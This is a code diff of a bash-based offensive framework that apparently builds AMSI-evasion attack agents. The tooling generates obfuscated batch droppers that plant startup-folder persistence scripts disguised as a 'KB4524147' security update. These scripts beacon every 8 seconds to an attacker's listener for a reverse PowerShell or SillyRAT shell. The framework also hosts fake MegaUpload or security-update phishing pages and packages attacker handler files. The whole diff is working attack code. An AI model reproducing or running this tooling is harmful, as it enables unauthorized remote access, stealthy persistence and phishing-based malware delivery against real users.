@@ -10275,7 +10275,7 @@ Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Pr
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
-random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
+Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -10533,22 +10533,56 @@ cd $IPATH
 sleep 2
 
 
-dtr=$(date|awk {'print $2,$3,$4,$5'})
+cd $IPATH/output
+## Persistence handler script (zip) creation ..
 if [ "$persistence" = "Add persistence" ]; then
-   ## Write how to delete persistence to output folder ..
-   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH : $rpath\\$Drop.py" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER     : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER     : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   zenity --title="☠ SillyRAT persistence ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
+
+   dtr=$(date|awk {'print $2,$3,$4,$5'})
+   cp $IPATH/bin/handlers/handler3.sh $IPATH/output/handler.sh
+   ## Config handler script variable declarations ..
+   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
+   sed -i "s|$two|ID='$Id'|" handler.sh
+   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
+   sed -i "s|$tree|CLIENT='$Drop.py'|" handler.sh
+   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
+   sed -i "s|$four|LPORT='$lport'|" handler.sh
+   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
+   sed -i "s|$five|LHOST='$lhost'|" handler.sh
+   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
+   sed -i "s|$seven|RPATH='$rpath\\\\$Drop.py'|" handler.sh
+   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
+   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
+   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
+   sed -i "s|$nove|DROPPER='$Drop.bat'|" handler.sh
+
+
+   ## Write README file (to be compressed)
+   echo "Id          : $Id" > README
+   echo "Description : Reverse TCP python Shell (SillyRAT)" >> README
+   echo "Categorie   : Amsi Evasion (agent nº6)" >> README
+   echo "Active On   : $dtr" >> README
+   echo "Lhost|Lport : $lhost:$lport" >> README
+   echo "" >> README
+   echo "Instructions" >> README
+   echo "------------" >> README
+   echo "1 - cd output" >> README
+   echo "2 - unzip handler_ID:$Id.zip" >> README
+   echo "3 - sh handler.sh" >> README
+   echo "" >> README
+   echo "Detail Description" >> README
+   echo "------------------" >> README
+   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
+   echo "agent nº6 build. Them the dropper when executed it will create in" >> README
+   echo "remote target startup folder a script named 'KB4524147.update.bat'" >> README
+   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
+   echo "and creates this handler file (zip) to store attacker handler settings." >> README
+
+
+   ## zip handler files
+   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
+   zip handler_ID:$Id.zip handler.sh server.py README -m -q
+   cd $IPATH
+   zenity --title="☠ Reverse TCP python Shell (SillyRAT) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
 fi
 
 
@@ -10557,7 +10591,8 @@ echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
 rm $ApAcHe/$Drop.py > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $IPATH/output/$Drop > /dev/nul 2>&1
-# rm $IPATH/output/$Drop.c > /dev/nul 2>&1
+rm $IPATH/output/$Drop.c > /dev/nul 2>&1
+rm $IPATH/output/$Drop.py > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 rm $IPATH/output/dropper.c > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
@@ -12738,7 +12773,7 @@ sleep 2
 ## Store User Inputs (bash variable declarations)..
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
@@ -12755,7 +12790,7 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
-random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
+Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12776,9 +12811,9 @@ echo "---"
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 else
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 fi
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
@@ -12804,22 +12839,22 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
+      echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
-      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo :: Framework: venom v1.0.17 - shinigami >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat   
-      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :: Framework: venom v1.0.17 - shinigami >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat   
+      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
    echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
@@ -12864,8 +12899,8 @@ cd $IPATH/output
 ## Delete old certs to prevent future errors.
 rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
-echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
-xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
+echo "${BlueF}[☠]${white} Building SSL certificates (openssl) .."${Reset};sleep 2
+xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
 cd $IPATH
 
@@ -12874,7 +12909,7 @@ cd $IPATH
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
-    cd $IPATH/templates/phishing
+   cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
    mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 else
@@ -12888,7 +12923,7 @@ cd $IPATH
 
 cd $IPATH/output
 ## Copy files to apache2 webroot
-zip $Drop.zip $Drop.bat > /dev/nul 2>&1
+zip $Drop.zip $Drop.bat -q
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
@@ -12913,7 +12948,6 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
 xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
-dtr=$(date|awk {'print $2,$3,$4,$5'})
 cd $IPATH
 sleep 2
 
@@ -12929,28 +12963,60 @@ rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 
-## Remark related to 'persistence' function..
+cd $IPATH/output
+## Persistence handler script (zip) creation ..
 if [ "$persistence" = "Add persistence" ]; then
-   ## Write how to delete persistence to output folder ..
-   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH : $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER     : cd output" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER     : sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
-   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   else
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   fi
-   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
+
+   dtr=$(date|awk {'print $2,$3,$4,$5'})
+   cp $IPATH/bin/handlers/handler.sh $IPATH/output/handler.sh
+   ## Config handler script variable declarations ..
+   one=$(cat handler.sh | egrep -m 1 "DOMAIN") > /dev/null 2>&1
+   sed -i "s|$one|DOMAIN='$CN'|" handler.sh
+   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
+   sed -i "s|$two|ID='$Id'|" handler.sh
+   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
+   sed -i "s|$tree|CLIENT='$NaM.ps1'|" handler.sh
+   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
+   sed -i "s|$four|LPORT='$lport'|" handler.sh
+   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
+   sed -i "s|$five|LHOST='$lhost'|" handler.sh
+   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
+   sed -i "s|$seven|RPATH='$rpath\\\\$NaM.ps1'|" handler.sh
+   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
+   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
+   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
+   sed -i "s|$nove|DROPPER='$Drop.bat'|" handler.sh
+
+
+   ## Write README file (to be compressed)
+   echo "Id          : $Id" > README
+   echo "Description : Reverse OpenSSL Powershell Shell" >> README
+   echo "Categorie   : Amsi Evasion (agent nº2)" >> README
+   echo "Active On   : $dtr" >> README
+   echo "Lhost|Lport : $lhost:$lport" >> README
+   echo "" >> README
+   echo "How to Instructions" >> README
+   echo "-------------------" >> README
+   echo "1 - cd output" >> README
+   echo "2 - unzip handler_ID:$Id.zip" >> README
+   echo "3 - sh handler.sh" >> README
+   echo "" >> README
+   echo "Detail Description" >> README
+   echo "------------------" >> README
+   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
+   echo "agent nº2 build. Them the dropper when executed it will create in" >> README
+   echo "remote target startup folder a script named 'KB4524147_$Id.update.bat'" >> README
+   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
+   echo "and creates this handler file (zip) to store attacker handler settings." >> README
+
+
+   ## zip handler files
+   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
+   zip handler_ID:$Id.zip handler.sh cert.pem key.pem README -m -q
+   cd $IPATH
+   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
 else
-   ## Only delete certs' IF persitence was NOT sellected.
+   ## Delete certs IF persitence was NOT sellected.
    rm $IPATH/output/cert.pem > /dev/nul 2>&1
    rm $IPATH/output/key.pem > /dev/nul 2>&1
 fi
@@ -12988,14 +13054,14 @@ rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
-if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
-random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
+Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 ## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
@@ -13030,9 +13096,9 @@ echo "---"
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 else
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 fi
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
@@ -13058,22 +13124,22 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-     echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+     echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
-      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
